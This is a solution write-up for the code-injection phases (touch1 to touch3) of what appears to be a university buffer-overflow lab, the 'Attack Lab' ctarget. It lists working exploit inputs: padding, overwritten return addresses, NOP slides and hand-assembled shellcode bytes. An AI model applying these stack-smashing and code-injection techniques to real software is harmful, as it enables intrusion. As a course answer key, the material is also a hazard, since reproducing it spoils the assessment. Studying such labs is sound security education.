# ctarget
This target allows the user to use Code Injection.

# touch1
This is an easy phase that only includes overriding the return address to call touch1() directly. The complete gadget chain is as follows:
```
0x00*40            // 0x00*40 to pad the buffer
0x00000000004017C0 // Return address to touch1
```

# touch2
The idea here is to use Code Injection to call touch2() with the literal cookie value.

First we want to create a `nop` slide until our injected code. The buffer is only 40 bytes long. We will calculate the length of our code later.
```
0x90 * (40-len(injected_code)) // nop slide
```

Then, we want to override the return address to call to the top of the buffer. This will allow us to execute the code we just injected.
```
0x000000005561dc78 // The pointer to the top of the buffer (0x5561dc78)
```

Now for the injected code. Here, we set `rdi` to the cookie value and then call `touch2`.
```
48 c7 c7 fa 97 b9 59 // mov rdi, 0x59b997fa
48 c7 c0 ec 17 40 00 // mov rax, 0x4017ec
ff d0                // call rax
```

The length of the injected code is 16 bytes. The complete input for this phase is as follows:
```
0x90 * 24            // nop slide
48 c7 c7 fa 97 b9 59 // mov rdi, 0x59b997fa
48 c7 c0 ec 17 40 00 // mov rax, 0x4017ec
ff d0                // call rax
0x000000005561dc78   // Return address to the top of the buffer
```


# touch3
The goal of this phase is to call touch3() with a pointer to a string that contains the hex representation of the cookie (0x59b997fa). We will also use Code Injection to achieve this.

First, we want to create a `nop` slide until our injected code. The buffer is only 40 bytes long. We will calculate the length of our code later.
```
0x90 * (40-len(injected_code)) // nop slide
```

Now, we will put the string pointer in `rdi`. The final pointer is calculated by adding 40 (buffer + 8 bytes for return address of rsp + 8 bytes for touch3) to the address of the top of the buffer (0x5561dc78). This is because we will place the string further down the stack, so no other code will overwrite it.
```
48 c7 c7 78 dc 61 55 // mov rdi, 0x5561dc78
48 83 c7 28          // add rdi, 0x28
```

We can now put the string "59b997fa" in the stack. We can do this by moving the string into `rax` and then moving it to the address pointed by `rdi`. We also need to null terminate the string.
```
48 b8 35 39 62 39 39 37 66 61 // movabs rax, 0x6166373939623935
48 89 07                      // movq [rdi], rax
c6 47 08 00                   // movb [rdi+0x8], 0x0
```

Finally we can call touch3() with the pointer to the string in `rdi`.
```
48 c7 c0 fa 18 40 00 // mov  rax,0x4018fa
ff d0                // call rax
```

The length of the injected code is 37 bytes. The complete input for this phase is as follows:
```
0x90 * 3                      // nop slide
48 c7 c7 78 dc 61 55          // mov rdi, 0x5561dc78
48 83 c7 28                   // add rdi, 0x28
48 b8 35 39 62 39 39 37 66 61 // movabs rax, 0x6166373939623935
48 89 07                      // movq [rdi], rax
c6 47 08 00                   // movb [rdi+0x8], 0x0
48 c7 c0 fa 18 40 00          // mov  rax,0x4018fa
ff d0                         // call rax
0x000000005561dc78            // Return address to the top of the buffer
```